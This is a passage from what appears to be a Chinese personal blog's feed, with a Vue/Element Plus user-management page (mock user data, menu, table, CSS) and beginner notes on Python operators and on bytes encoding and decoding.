class="attr">time</span>: <span class="string">&#x27;2017-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;4&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;gth&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;123456@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;1234567890&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;实践&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">time</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;5&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;tony&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;12345586@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;123434567890&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;实践&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">time</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;6&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;gaga&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;123456@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;12364567890&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;实践&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">time</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;7&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;Tom&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;123456@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;1234567890&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;实践&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">time</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#123;</span></span><br><span class="line"><span class="language-javascript">    number : <span class="string">&#x27;8&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&#x27;Tom&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">email</span>: <span class="string">&#x27;123456@qq.com&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">phone</span>: <span class="string">&#x27;1234567890&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">people</span>: <span class="string">&#x27;实践&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">time</span>: <span class="string">&#x27;2016-05-02&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">]</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;common-layout&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">el-container</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-aside</span> <span class="attr">class</span>=<span class="string">&quot;ce&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-row</span> <span class="attr">class</span>=<span class="string">&quot;tac&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;24&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-menu</span> <span class="attr">active-text-color</span>=<span class="string">&quot;#ffd04b&quot;</span> <span class="attr">background-color</span>=<span class="string">&quot;#334256&quot;</span> <span class="attr">class</span>=<span class="string">&quot;el-menu-vertical-demo&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">default-active</span>=<span class="string">&quot;2&quot;</span> <span class="attr">text-color</span>=<span class="string">&quot;#fff&quot;</span> @<span class="attr">open</span>=<span class="string">&quot;handleOpen&quot;</span> @<span class="attr">close</span>=<span class="string">&quot;handleClose&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">User</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">span</span>&gt;</span>用户管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item-group</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-1&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span><span class="tag">&lt;<span class="name">icon-menu</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>用户列表<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-2&quot;</span>&gt;</span>用户选择<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-menu-item-group</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-3&quot;</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-menu-item-group</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-sub-menu</span> <span class="attr">index</span>=<span class="string">&quot;1-4&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">template</span> #<span class="attr">title</span>&gt;</span>删除用户<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;1-4-1&quot;</span>&gt;</span>选择用户<span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-sub-menu</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Setting</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>权限管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Shop</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>商品管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Document</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>订单管理<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-menu-item</span> <span class="attr">index</span>=<span class="string">&quot;5&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">PieChart</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span>&gt;</span>数据统计<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-menu-item</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-menu</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-aside</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">el-container</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-header</span> &gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;style-box&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-row</span> <span class="attr">class</span>=<span class="string">&quot;tac&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;text-align: left;font-isze: 20px;color: #000;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">el-icon</span>&gt;</span><span class="tag">&lt;<span class="name">Expand</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span>首页 /用户列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;24&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-icon</span>&gt;</span><span class="tag">&lt;<span class="name">Ship</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-icon</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">el-main</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">el-card</span> <span class="attr">class</span>=<span class="string">&quot;box-card&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;text item&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">el-row</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">                <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;12&quot;</span>&gt;</span>  <span class="tag">&lt;<span class="name">el-input</span> <span class="attr">v-model</span>=<span class="string">&quot;input&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入搜索内容&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;2&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span>&gt;</span>搜索<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span><span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;1&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span>&gt;</span>添加用户<span class="tag">&lt;/<span class="name">el-button</span>&gt;</span><span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">                 </span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line">              </span><br><span class="line">              <span class="tag">&lt;<span class="name">el-row</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;24&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-table</span> <span class="attr">:data</span>=<span class="string">&quot;tableData&quot;</span> <span class="attr">border</span> <span class="attr">style</span>=<span class="string">&quot;width: 100%&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;number&quot;</span> <span class="attr">label</span>=<span class="string">&quot;#&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;name&quot;</span> <span class="attr">label</span>=<span class="string">&quot;姓名&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;email&quot;</span> <span class="attr">label</span>=<span class="string">&quot;邮箱&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">label</span>=<span class="string">&quot;手机&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;people&quot;</span> <span class="attr">label</span>=<span class="string">&quot;角色&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;status&quot;</span> <span class="attr">label</span>=<span class="string">&quot;状态&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-switch</span> <span class="attr">v-model</span>=<span class="string">&quot;value1&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;time&quot;</span> <span class="attr">label</span>=<span class="string">&quot;创建时间&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">el-table-column</span> <span class="attr">prop</span>=<span class="string">&quot;option&quot;</span> <span class="attr">label</span>=<span class="string">&quot;操作&quot;</span> <span class="attr">width</span>=<span class="string">&quot;150&quot;</span> &gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;primary&quot;</span> <span class="attr">:icon</span>=<span class="string">&quot;Edit&quot;</span> <span class="attr">circle</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;danger&quot;</span> <span class="attr">:icon</span>=<span class="string">&quot;Delete&quot;</span> <span class="attr">circle</span> /&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">el-button</span> <span class="attr">type</span>=<span class="string">&quot;warning&quot;</span> <span class="attr">:icon</span>=<span class="string">&quot;Star&quot;</span> <span class="attr">circle</span> /&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">el-table-column</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-table</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line">              </span><br><span class="line">              <span class="tag">&lt;<span class="name">el-row</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-col</span> <span class="attr">:span</span>=<span class="string">&quot;24&quot;</span> <span class="attr">class</span>=<span class="string">&quot;page&quot;</span> &gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">el-pagination</span> <span class="attr">v-model:current-page</span>=<span class="string">&quot;currentPage4&quot;</span> <span class="attr">v-model:page-size</span>=<span class="string">&quot;pageSize4&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">:page-sizes</span>=<span class="string">&quot;[100, 200, 300, 400]&quot;</span> <span class="attr">:small</span>=<span class="string">&quot;small&quot;</span> <span class="attr">:disabled</span>=<span class="string">&quot;disabled&quot;</span> <span class="attr">:background</span>=<span class="string">&quot;background&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">layout</span>=<span class="string">&quot;total, sizes, prev, pager, next, jumper&quot;</span> <span class="attr">:total</span>=<span class="string">&quot;400&quot;</span> @<span class="attr">size-change</span>=<span class="string">&quot;handleSizeChange&quot;</span></span></span><br><span class="line"><span class="tag">                  @<span class="attr">current-change</span>=<span class="string">&quot;handleCurrentChange&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">el-col</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">el-row</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">el-card</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">el-main</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">el-container</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.ce</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">15vw</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: <span class="number">#334256</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.title</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.style-box</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">width</span>: <span class="number">200vh</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">height</span>: <span class="number">5vw</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-color</span>: white;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">color</span>: <span class="number">#000</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">box-shadow</span>: <span class="number">5px</span> <span class="number">5px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.3</span>);</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.box</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">font-size</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所展现的结果是：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702343304570-e585a325-e930-4062-9a92-2dcf8e886604.png" alt="image.png"><br>后面尝试做了下用列表进行数据绑定，连name的报错，直接划掉了。这上面结果还是有缺点就是状态部分不能分开是一起的。</p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue网页制作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运算符</title>
      <link href="/2023/12/10/%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
      <url>/2023/12/10/%E8%BF%90%E7%AE%97%E7%AC%A6/</url>
      
        <content type="html"><![CDATA[<p>1.算术运算<br> +- * &#x2F; %  &#x2F;&#x2F; (整除)<br>2.比较运算<br>&lt; &gt; &lt;&#x3D; &gt;&#x3D; &#x3D;&#x3D;(判断左右两端是否一致)  !&#x3D;<br>3.赋值运算<br>      &#x3D; +&#x3D;  -&#x3D; *&#x3D;<br>a +&#x3D;b  &#x3D;&gt;  a&#x3D;a+b<br>4.逻辑运算<br>     and,并且，左右两端同时成立，结果才成立<br>     or，或者，左右两端有一个成立，结果就成立<br>     not，非，非真既假，非假既真<br>当and和or和not同时出现时最好加上括号，不会产生歧义或者不会理解的问题<br>如果没有括号怎么办：<br>记住运算顺序：<br>先算括号&gt;算not&gt;算and&gt;算not<br>5.成员运算<br>in :判断xxx在xxxxx出现了<br>not in:判断xxx不在xxxxx出现了</p><p>%取余数<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702132972083-6be23800-3cb8-499a-8162-ccd4f8a8c252.png" alt="image.png"><br>判断该数字是不是35的倍数：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702133318759-e0731124-3cea-4666-8d79-87c863a73b00.png" alt="image.png"><br>&#x2F;&#x2F;整除出现的结果是商<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702133573227-fd44f06b-6181-4491-85b3-ac2389695180.png" alt="image.png"><br>直接去除的结果是小数<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702133622966-d38ac7ae-99c7-4179-aa0f-64d9a6747400.png" alt="image.png"><br>一个&#x3D;是赋值，两个&#x3D;是条件判断<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702133942006-07aee2da-11f7-4473-aa42-af648e8cb1f2.png" alt="image.png"><br>赋值运算将a和b的值进行互换<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702134397706-42a4522a-4efb-43fe-bed1-48d3c3db9b84.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702134367983-0d340e6f-a81f-4470-8495-96ad31cc5cc4.png" alt="image.png"><br>用到中间变量进行备份就不会出现数据覆盖的情况，此时a和b能够进行互换<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702134569783-6b197f54-2be3-45f1-89b9-96b4a430ff7f.png" alt="image.png"><br>此种情况只能用于python<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702134764626-2f083650-41ae-42f3-bb4e-59f2dd653126.png" alt="image.png"><br>从1加到100的结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702135076054-2f10f137-57d6-41a8-9b14-0663b36bfd1e.png" alt="image.png"></p><p>逻辑运算：<br>        and运算：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702135310356-a59d1b80-4e70-4133-96e8-adcd9b23032a.png" alt="image.png"><br>      or运算：或者<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702135469405-8b8d1415-0d8a-4ab1-b798-dc71e78c75ef.png" alt="image.png"><br>not运算：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702135657582-2496e12e-6f3f-42df-893f-182e9b92297b.png" alt="image.png"><br>模拟用户登录：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702135950339-68bfd9b6-5731-4163-bf03-8ec7870b5e26.png" alt="image.png"><br>成员运算：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702136667718-d8ad0816-d8f0-419f-9078-25e9467e210b.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bytes</title>
      <link href="/2023/12/10/bytes/"/>
      <url>/2023/12/10/bytes/</url>
      
        <content type="html"><![CDATA[<h2 id="编码和解码"><a href="#编码和解码" class="headerlink" title="编码和解码"></a>编码和解码</h2><p>encode编码：进行转换<br>b’xxxxxx’ bytes类型 一个\xx是一个byte也就是说邓官诚gbk转换成byte类型是6个byte<br>b’xxxxxx’ bytes类型 一个\xx是一个byte也就是说邓官诚utf-8转换成byte类型是9个byte<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702131454433-aca89cc7-b6ac-4902-b564-7e7554c913f1.png" alt="image.png"><br>怎么把gbk转换成utf-8类型的呢?<br>先变成文字符号(字符串)此时用到了解码decode<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702131734543-9f0376a9-7274-4360-9a39-af111322fd87.png" alt="image.png"><br>再去重新定义一个变量对字符串进行编码encode<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702131886957-3b0c7a20-8fa1-48be-acbc-676eb84441fe.png" alt="image.png"><br>在这段文字中asd会正常显示因为是英文，英文不管在什么编码中都是正常显示的<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1702132364879-fa954fa2-ae5b-478f-b135-88ccd94cfb1d.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符集和编码</title>
      <link href="/2023/12/10/%E5%AD%97%E7%AC%A6%E9%9B%86%E5%92%8C%E7%BC%96%E7%A0%81/"/>
      <url>/2023/12/10/%E5%AD%97%E7%AC%A6%E9%9B%86%E5%92%8C%E7%BC%96%E7%A0%81/</url>
      
